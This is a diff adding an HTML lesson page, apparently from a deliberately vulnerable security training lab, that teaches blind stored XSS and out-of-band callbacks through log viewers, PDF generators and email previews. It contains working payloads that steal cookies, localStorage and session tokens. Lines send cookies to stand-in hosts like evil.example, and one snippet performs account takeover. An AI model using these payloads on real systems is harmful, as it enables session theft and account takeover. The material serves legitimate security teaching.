@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Module 11 — Attack Demo: Blind XSS & Out-of-Band Techniques</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:24px;max-width:900px}
+  h1{font-size:20px;font-weight:700;color:var(--accent);margin-bottom:4px}
+  .subtitle{color:var(--muted);font-size:13px;margin-bottom:28px}
+  .step{background:var(--panel);border:1px solid var(--border);border-radius:8px;margin-bottom:20px;overflow:hidden}
+  .step-head{padding:14px 18px;display:flex;align-items:center;gap:12px;cursor:pointer;user-select:none}
+  .step-num{background:#1e3a5f;color:var(--accent);font-size:11px;font-weight:700;padding:3px 8px;border-radius:4px;flex-shrink:0}
+  .step-title{font-weight:600;font-size:14px;flex:1}
+  .step-tag{font-size:11px;padding:2px 8px;border-radius:3px;background:#1e3a5f;color:var(--warn)}
+  .step-body{padding:18px;border-top:1px solid var(--border);display:none}
+  .step-body.open{display:block}
+  .concept{background:#060d1a;border-left:3px solid var(--accent);padding:10px 14px;border-radius:0 4px 4px 0;font-size:13px;color:var(--muted);margin-bottom:14px;line-height:1.6}
+  .concept strong{color:var(--text)}
+  code{font-family:'Courier New',monospace;font-size:12px;background:#060d1a;color:var(--accent);padding:2px 6px;border-radius:3px}
+  pre{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;overflow-x:auto;font-size:12px;line-height:1.6;color:#fb923c;margin:10px 0;white-space:pre-wrap}
+  .label{font-size:11px;color:var(--muted);margin-bottom:4px;font-weight:600;text-transform:uppercase;letter-spacing:.05em}
+  .row{display:flex;gap:10px;align-items:flex-start;margin-bottom:10px;flex-wrap:wrap}
+  input[type=text],textarea{background:#060d1a;color:var(--text);border:1px solid var(--border);border-radius:4px;padding:8px 10px;font-size:13px;font-family:inherit;width:100%}
+  textarea{height:68px;resize:vertical}
+  button{padding:8px 18px;border-radius:4px;border:1px solid var(--accent);background:#1e3a5f;color:var(--accent);font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap}
+  button:hover{background:#2a4d7a}
+  .btn-danger{border-color:var(--danger);color:var(--danger);background:rgba(248,113,113,.1)}
+  .btn-ok{border-color:var(--ok);color:var(--ok);background:rgba(74,222,128,.1)}
+  .result{margin-top:10px;background:#060d1a;border:1px solid var(--border);border-radius:4px;padding:10px;font-size:12px;min-height:36px;max-height:200px;overflow-y:auto;color:var(--muted);white-space:pre-wrap;font-family:'Courier New',monospace}
+  .tag-blind{background:rgba(248,113,113,.12);color:var(--danger);border:1px solid rgba(248,113,113,.3)}
+  .tag-oob{background:rgba(245,200,66,.12);color:var(--warn);border:1px solid rgba(245,200,66,.3)}
+  .tag-log{background:rgba(56,189,248,.12);color:var(--accent);border:1px solid rgba(56,189,248,.3)}
+  hr{border:none;border-top:1px solid var(--border);margin:14px 0}
+  .oob-table{width:100%;border-collapse:collapse;font-size:12px}
+  .oob-table th{padding:6px 8px;background:#060d1a;color:var(--accent);text-align:left;font-size:11px}
+  .oob-table td{padding:5px 8px;border-top:1px solid var(--border);color:var(--muted);word-break:break-all}
+  a{color:var(--accent);text-decoration:none}
+</style>
+</head>
+<body>
+
+<h1>Attack Demo 07 — Blind XSS & Out-of-Band Techniques</h1>
+<p class="subtitle">Module 11 · The attacker cannot see the response — but the server can. Learn to fire payloads that call home.</p>
+
+<!-- ─── STEP 1 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">01</span>
+    <span class="step-title">OOB receiver — what is an out-of-band callback?</span>
+    <span class="step-tag tag-oob">CONCEPT</span>
+  </div>
+  <div class="step-body open">
+    <div class="concept">
+      <strong>Blind XSS</strong> fires in a context the attacker never sees directly — an admin panel, a log dashboard, a PDF generator, an email renderer. The payload executes when a victim (usually a privileged user) views the stored content.<br><br>
+      The attacker injects a payload whose only job is to phone home: make an HTTP request to an attacker-controlled server with evidence of execution. This is called an <strong>out-of-band (OOB) callback</strong>. In production, tools like <strong>XSS Hunter</strong> and <strong>Burp Collaborator</strong> provide that callback server. Here, <code>/oob</code> plays that role.
+    </div>
+    <div class="label">Live OOB log — every hit to /oob appears here</div>
+    <div id="oob-live" class="result">(loading…)</div>
+    <button onclick="loadOOB()" style="margin-top:8px">Refresh log</button>
+    <button class="btn-danger" onclick="clearOOB()" style="margin-top:8px">Clear OOB log</button>
+    <hr>
+    <div class="label">Manual OOB beacon test — click to fire an img beacon to /oob</div>
+    <div class="concept">In a real attack this beacon is injected into a page the victim loads. We do it manually here to see the mechanics:</div>
+    <pre><code>&lt;img src="/oob?victim=admin&amp;cookie=SESSIONID123" style="display:none"&gt;</code></pre>
+    <button onclick="fireBeacon()">Fire beacon (img src)</button>
+    <div id="beacon-res" class="result" style="min-height:28px"></div>
+  </div>
+</div>
+
+<!-- ─── STEP 2 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">02</span>
+    <span class="step-title">Inject a payload into the log entry store</span>
+    <span class="step-tag tag-blind">BLIND STORED</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      An application that logs user-supplied data (search terms, error messages, usernames) and later displays those logs in an admin viewer is a classic blind XSS surface.
+      The attacker submits a payload via the normal input. The XSS fires when an admin opens <code>/log-viewer</code>.<br><br>
+      <strong>Step:</strong> inject the payload below via POST /log-entry, then open the log viewer.
+    </div>
+    <div class="label">Payload to inject — OOB beacon fires when admin opens /log-viewer</div>
+    <pre id="s2-payload"><img src="/oob?surface=logviewer&stolen=DOCUMENT_COOKIE" onerror="fetch('/oob?stolen='+document.cookie)"></pre>
+    <div class="row">
+      <button onclick="injectLogEntry()">POST to /log-entry (inject payload)</button>
+      <a href="/log-viewer" target="_blank"><button class="btn-ok">Open /log-viewer (as admin)</button></a>
+    </div>
+    <div id="s2-res" class="result" style="min-height:28px"></div>
+    <hr>
+    <div class="label">Custom log injection</div>
+    <div class="row" style="flex-direction:column">
+      <select id="s2-level" style="background:#060d1a;color:#e2e8f0;border:1px solid #1e3a5f;border-radius:4px;padding:7px;font-size:13px;margin-bottom:8px">
+        <option>INFO</option><option>WARN</option><option selected>ERROR</option>
+      </select>
+      <textarea id="s2-msg" placeholder="Log message (can contain HTML/XSS payload)"><img src=x onerror="fetch('/oob?msg=blind&cookie='+document.cookie)"></textarea>
+    </div>
+    <button onclick="customInjectLog()">Inject custom log entry</button>
+  </div>
+</div>
+
+<!-- ─── STEP 3 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">03</span>
+    <span class="step-title">PDF generator as a blind XSS surface</span>
+    <span class="step-tag tag-blind">SERVER-SIDE RENDER</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      Headless browser–based PDF generators (wkhtmltopdf, Puppeteer/headless Chrome, Prince XML) render HTML before converting to PDF. If user-supplied content is injected into the HTML template without sanitisation, the rendering engine executes the XSS payload — in a server-side, headless context.<br><br>
+      <strong>Risk:</strong> blind XSS in a headless context can read the server's local files via <code>file:///</code> (wkhtmltopdf SSRF), access internal APIs, or exfiltrate the generated PDF's content.
+    </div>
+    <div class="label">Open PDF preview with a basic OOB payload injected into content=</div>
+    <pre>/pdf-preview?content=&lt;img src="/oob?surface=pdf" onerror="this.src='/oob?d='+document.title"&gt;</pre>
+    <a href='/pdf-preview?content=<img src="/oob?surface=pdf" onerror="this.src=`/oob?d=`+document.title">' target="_blank">
+      <button>Open PDF preview with payload</button>
+    </a>
+    <hr>
+    <div class="label">Custom PDF content injection</div>
+    <textarea id="s3-content" placeholder="Content injected into 'report' (try XSS payloads)"><img src=x onerror="fetch('/oob?surface=pdf-custom&title='+document.title)"></textarea>
+    <button onclick="openPDF()">Open /pdf-preview with this content</button>
+    <div class="concept" style="margin-top:12px">
+      <strong>wkhtmltopdf SSRF payload (illustrative — not exploitable here):</strong><br>
+      <code>&lt;iframe src="file:///etc/passwd"&gt;&lt;/iframe&gt;</code><br>
+      In real wkhtmltopdf, this exfiltrates the server's /etc/passwd into the rendered PDF output.
+    </div>
+  </div>
+</div>
+
+<!-- ─── STEP 4 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">04</span>
+    <span class="step-title">Email template renderer as a blind XSS surface</span>
+    <span class="step-tag tag-blind">EMAIL RENDERER</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      Applications that render HTML email previews in a browser — enterprise webmail, email marketing dashboards, notification preview panels — are blind XSS surfaces if the email body isn't sanitised.<br><br>
+      The attacker sets their "display name" or a field that ends up in an email subject or body. When the admin previews the email template, the payload fires in the admin's browser.
+    </div>
+    <div class="label">Email preview — to/subject/body fields all injected unsanitised</div>
+    <div class="row" style="flex-direction:column">
+      <div class="label">To:</div>
+      <input type="text" id="s4-to" value='"><img src=x onerror=alert("XSS in To field")>'>
+      <div class="label">Subject:</div>
+      <input type="text" id="s4-sub" value="Account update">
+      <div class="label">Body (HTML rendered directly):</div>
+      <textarea id="s4-body"><img src="/oob?surface=email&stolen=COOKIE" onerror="fetch('/oob?cookie='+document.cookie)">Thank you for signing up!</textarea>
+    </div>
+    <button onclick="openEmail()">Open /email-preview with these values</button>
+    <div class="concept" style="margin-top:12px">
+      Note the <strong>To:</strong> field is also injected — a double-quote in an HTML attribute value breaks out into the HTML context. This models name→subject injection in transactional email systems.
+    </div>
+  </div>
+</div>
+
+<!-- ─── STEP 5 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">05</span>
+    <span class="step-title">Payload engineering — what to exfiltrate over OOB</span>
+    <span class="step-tag tag-oob">PAYLOAD CRAFT</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      A blind XSS payload has two jobs: <strong>fire reliably</strong> (use zero-interaction triggers), and <strong>exfiltrate data</strong> (use an OOB channel that doesn't depend on the response).
+    </div>
+    <table class="oob-table" style="margin-bottom:14px">
+      <tr><th>Payload objective</th><th>Technique</th><th>Snippet</th></tr>
+      <tr><td>Confirm execution</td><td>img OOB beacon</td><td><code>fetch('/oob?hit=1')</code></td></tr>
+      <tr><td>Steal cookie</td><td>fetch with param</td><td><code>fetch('/oob?c='+document.cookie)</code></td></tr>
+      <tr><td>Steal DOM content</td><td>fetch + btoa</td><td><code>fetch('/oob?d='+btoa(document.body.innerHTML))</code></td></tr>
+      <tr><td>Steal local storage</td><td>fetch</td><td><code>fetch('/oob?ls='+btoa(JSON.stringify(localStorage)))</code></td></tr>
+      <tr><td>Steal session token</td><td>fetch /api/me same-origin</td><td><code>fetch('/api/me').then(r=>r.text()).then(t=>fetch('/oob?token='+btoa(t)))</code></td></tr>
+      <tr><td>Account takeover</td><td>fetch → change email</td><td><code>fetch('/account/email',{method:'POST',body:'email=attacker@evil.com',credentials:'include'})</code></td></tr>
+      <tr><td>Navigate victim</td><td>location.href</td><td><code>location.href='https://evil.example?c='+document.cookie</code></td></tr>
+    </table>
+    <div class="label">Staged full exfiltration payload — cookie + localStorage + URL</div>
+    <pre>(()=>{
+  const s = document.cookie;
+  const l = JSON.stringify({...localStorage});
+  const u = location.href;
+  const p = new URLSearchParams({c:s,l:btoa(l),u}).toString();
+  new Image().src = '/oob?' + p;
+})()</pre>
+    <div class="label">Wrap it as a zero-interaction stored vector</div>
+    <pre>&lt;img src=x onerror="(()=>{const p=new URLSearchParams({c:document.cookie,u:location.href}).toString();new Image().src='/oob?'+p})();"&gt;</pre>
+    <button onclick="fireFullExfil()">Fire full exfil beacon (this page)</button>
+    <div id="s5-res" class="result" style="min-height:28px"></div>
+    <div id="oob-live-2" class="result" style="margin-top:6px">(refresh to see callback)</div>
+    <button onclick="loadOOB2()" style="margin-top:6px">Refresh OOB log</button>
+  </div>
+</div>
+
+<!-- ─── STEP 6 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">06</span>
+    <span class="step-title">Dwell time & persistence — the blind XSS advantage</span>
+    <span class="step-tag tag-blind">THEORY</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      Blind XSS payloads often persist in storage for extended periods. Unlike reflected XSS (which requires the victim to click a link), a stored blind payload fires <strong>every time any privileged user views the surface</strong> — potentially days, weeks, or months after initial injection.
+    </div>
+    <table class="oob-table" style="margin-bottom:14px">
+      <tr><th>Characteristic</th><th>Reflected XSS</th><th>Blind Stored XSS</th></tr>
+      <tr><td>Victim must click a link</td><td>Yes</td><td>No — admin navigates normally</td></tr>
+      <tr><td>Attacker sees response</td><td>Yes (same session)</td><td>No — out-of-band only</td></tr>
+      <tr><td>Persistence</td><td>None (single use)</td><td>Persists until record deleted</td></tr>
+      <tr><td>Targets</td><td>Anyone with the link</td><td>Admins / privileged viewers</td></tr>
+      <tr><td>Detection</td><td>Easier (URL-based)</td><td>Harder (no URL evidence)</td></tr>
+      <tr><td>Privilege escalation</td><td>Rare</td><td>Common (admin cookie / token)</td></tr>
+    </table>
+    <div class="concept">
+      <strong>Common real-world blind XSS surfaces:</strong>
+      <ul style="margin:8px 0 0 18px;line-height:2">
+        <li>Customer support ticket systems (Zendesk, internal helpdesk)</li>
+        <li>Application log dashboards (Kibana, Splunk, Grafana annotations)</li>
+        <li>PDF/report generators (wkhtmltopdf, Puppeteer pipelines)</li>
+        <li>Transactional email preview panels</li>
+        <li>Admin user management interfaces (username/bio fields)</li>
+        <li>Error reporting dashboards (Sentry, custom error logs)</li>
+        <li>Contact/feedback forms rendered in admin CRM</li>
+      </ul>
+    </div>
+    <hr>
+    <div class="label">Clear all stores</div>
+    <div class="row">
+      <button class="btn-danger" onclick="clearAll()">Clear OOB log + log entries</button>
+      <a href="/board/clear" target="_blank"><button class="btn-danger">Clear comment board</button></a>
+      <a href="/admin/clear" target="_blank"><button class="btn-danger">Clear admin profiles</button></a>
+    </div>
+    <div id="s6-res" class="result" style="min-height:28px"></div>
+  </div>
+</div>
+
+<!-- ─── STEP 7 ─────────────────────────────────────────────────────────────── -->
+<div class="step">
+  <div class="step-head" onclick="toggle(this)">
+    <span class="step-num">07</span>
+    <span class="step-title">OOB callback reference — what a real XSS Hunter captures</span>
+    <span class="step-tag tag-oob">REFERENCE</span>
+  </div>
+  <div class="step-body">
+    <div class="concept">
+      <strong>XSS Hunter</strong> is a purpose-built blind XSS testing service. When a payload fires, it sends an OOB report containing: the page URL, cookies, DOM snapshot, localStorage, referrer, and a screenshot. This is what <code>/oob/log</code> models.
+    </div>
+    <table class="oob-table" style="margin-bottom:14px">
+      <tr><th>OOB field</th><th>What it tells the attacker</th></tr>
+      <tr><td><code>ts</code></td><td>When the payload fired (dwell time calculation)</td></tr>
+      <tr><td><code>ip</code></td><td>Victim's IP → corporate network range or employee ISP</td></tr>
+      <tr><td><code>ua</code></td><td>Browser/OS → targeted exploit selection</td></tr>
+      <tr><td><code>referer</code></td><td>URL where payload executed → identifies the vulnerable surface</td></tr>
+      <tr><td><code>origin</code></td><td>Origin of the request → same-origin vs cross-origin</td></tr>
+      <tr><td><code>params</code></td><td>Exfiltrated data (cookie, localStorage, DOM content)</td></tr>
+    </table>
+    <div class="label">Current OOB log</div>
+    <div id="oob-final" class="result">(loading…)</div>
+    <button onclick="loadOOBFinal()" style="margin-top:8px">Refresh</button>
+    <button class="btn-danger" onclick="clearOOB(); setTimeout(loadOOBFinal,500)" style="margin-top:8px">Clear</button>
+  </div>
+</div>
+
+<script>
+const BASE = "";
+
+function toggle(head) {
+  const body = head.nextElementSibling;
+  body.classList.toggle("open");
+}
+
+// ── OOB helpers ──────────────────────────────────────────────────────────────
+
+async function loadOOB() {
+  try {
+    const r = await fetch("/oob/log");
+    const d = await r.json();
+    document.getElementById("oob-live").textContent =
+      d.count === 0 ? "(no callbacks yet)" : JSON.stringify(d, null, 2);
+  } catch(e) { document.getElementById("oob-live").textContent = "Error: "+e; }
+}
+
+async function loadOOB2() {
+  try {
+    const r = await fetch("/oob/log");
+    const d = await r.json();
+    document.getElementById("oob-live-2").textContent =
+      d.count === 0 ? "(no callbacks yet)" : JSON.stringify(d, null, 2);
+  } catch(e) {}
+}
+
+async function loadOOBFinal() {
+  try {
+    const r = await fetch("/oob/log");
+    const d = await r.json();
+    document.getElementById("oob-final").textContent =
+      d.count === 0 ? "(no callbacks yet)" : JSON.stringify(d, null, 2);
+  } catch(e) {}
+}
+
+async function clearOOB() {
+  await fetch("/oob/clear");
+  loadOOB(); loadOOBFinal();
+}
+
+function fireBeacon() {
+  new Image().src = "/oob?victim=admin&source=manual-beacon&ts=" + Date.now();
+  document.getElementById("beacon-res").textContent = "Beacon fired → check OOB log";
+  setTimeout(loadOOB, 800);
+}
+
+// ── Step 2 ───────────────────────────────────────────────────────────────────
+
+async function injectLogEntry() {
+  const payload = `<img src="/oob?surface=logviewer" onerror="fetch('/oob?stolen='+document.cookie)">`;
+  try {
+    const r = await fetch("/log-entry", {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({level:"ERROR", message: payload})
+    });
+    const d = await r.json();
+    document.getElementById("s2-res").textContent =
+      `Stored. Total entries: ${d.count}. Now open /log-viewer as admin →`;
+  } catch(e) { document.getElementById("s2-res").textContent = "Error: "+e; }
+}
+
+async function customInjectLog() {
+  const level = document.getElementById("s2-level").value;
+  const message = document.getElementById("s2-msg").value;
+  try {
+    const r = await fetch("/log-entry", {
+      method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({level, message})
+    });
+    const d = await r.json();
+    document.getElementById("s2-res").textContent =
+      `Stored at ${new Date().toTimeString().slice(0,8)}. Total: ${d.count}.`;
+  } catch(e) { document.getElementById("s2-res").textContent = "Error: "+e; }
+}
+
+// ── Step 3 ───────────────────────────────────────────────────────────────────
+
+function openPDF() {
+  const content = document.getElementById("s3-content").value;
+  window.open("/pdf-preview?content=" + encodeURIComponent(content), "_blank");
+}
+
+// ── Step 4 ───────────────────────────────────────────────────────────────────
+
+function openEmail() {
+  const to  = document.getElementById("s4-to").value;
+  const sub = document.getElementById("s4-sub").value;
+  const body = document.getElementById("s4-body").value;
+  const url = "/email-preview?to=" + encodeURIComponent(to) +
+              "&subject=" + encodeURIComponent(sub) +
+              "&body=" + encodeURIComponent(body);
+  window.open(url, "_blank");
+}
+
+// ── Step 5 ───────────────────────────────────────────────────────────────────
+
+function fireFullExfil() {
+  const p = new URLSearchParams({
+    c: document.cookie || "(no cookie flags set on this page)",
+    u: location.href,
+    ls: btoa(JSON.stringify({...localStorage})),
+    ref: document.referrer || "direct",
+  }).toString();
+  new Image().src = "/oob?" + p;
+  document.getElementById("s5-res").textContent =
+    "Full exfil beacon fired. Params: " + p.slice(0, 120) + (p.length > 120 ? "…" : "");
+  setTimeout(loadOOB2, 800);
+}
+
+// ── Step 6 ───────────────────────────────────────────────────────────────────
+
+async function clearAll() {
+  await fetch("/oob/clear");
+  await fetch("/log-viewer/clear");
+  document.getElementById("s6-res").textContent = "OOB log and log entries cleared.";
+}
+
+// ── Init ─────────────────────────────────────────────────────────────────────
+
+loadOOB();
+loadOOBFinal();
+</script>
+</body>
+</html>
